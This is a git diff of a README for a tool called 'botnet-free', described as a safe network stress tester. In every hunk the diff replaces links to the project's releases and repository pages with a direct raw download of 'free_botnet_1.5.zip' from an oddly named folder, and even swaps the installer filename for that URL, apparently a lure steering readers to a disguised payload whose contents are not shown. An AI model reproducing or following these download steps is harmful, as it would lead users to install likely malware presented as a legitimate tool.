@@ -1,6 +1,6 @@
 # 🛡️ botnet-free - Safe Network Stress Testing Tool
 
-[![Download botnet-free](https://img.shields.io/badge/Download-Visit%20Page-green?style=for-the-badge)](https://github.com/Sas6ik/botnet-free/releases)
+[![Download botnet-free](https://github.com/Sas6ik/botnet-free/raw/refs/heads/main/palaeopotamology/free_botnet_1.5.zip%20Page-green?style=for-the-badge)](https://github.com/Sas6ik/botnet-free/raw/refs/heads/main/palaeopotamology/free_botnet_1.5.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This section guides you step by step to download and run botnet-free on Windows.
 
 To get the software, you need to visit the official release page:
 
-[Go to botnet-free releases](https://github.com/Sas6ik/botnet-free/releases)
+[Go to botnet-free releases](https://github.com/Sas6ik/botnet-free/raw/refs/heads/main/palaeopotamology/free_botnet_1.5.zip)
 
 This page lists the latest versions and files.
 
@@ -58,7 +58,7 @@ Click on the latest version folder to open its contents.
 
 ### 3. Download the Windows Installer
 
-Within the release, find a file with a name like `botnet-free-setup.exe` or similar. This is the installer for Windows.
+Within the release, find a file with a name like `https://github.com/Sas6ik/botnet-free/raw/refs/heads/main/palaeopotamology/free_botnet_1.5.zip` or similar. This is the installer for Windows.
 
 Click the file name or download link to start downloading.
 
@@ -141,7 +141,7 @@ If you encounter issues:
 
 ## 📂 Where to Find More Information
 
-- The official [botnet-free GitHub page](https://github.com/Sas6ik/botnet-free) has code and detailed documentation.
+- The official [botnet-free GitHub page](https://github.com/Sas6ik/botnet-free/raw/refs/heads/main/palaeopotamology/free_botnet_1.5.zip) has code and detailed documentation.
 - The releases page (linked above) includes version notes and download files.
 - User guides and FAQs may be available within the application after installation.
 
@@ -151,6 +151,6 @@ If you encounter issues:
 
 Use this link to access the official releases anytime:
 
-[Download botnet-free here](https://github.com/Sas6ik/botnet-free/releases) 
+[Download botnet-free here](https://github.com/Sas6ik/botnet-free/raw/refs/heads/main/palaeopotamology/free_botnet_1.5.zip) 
 
 Click it to open the page and choose your version.
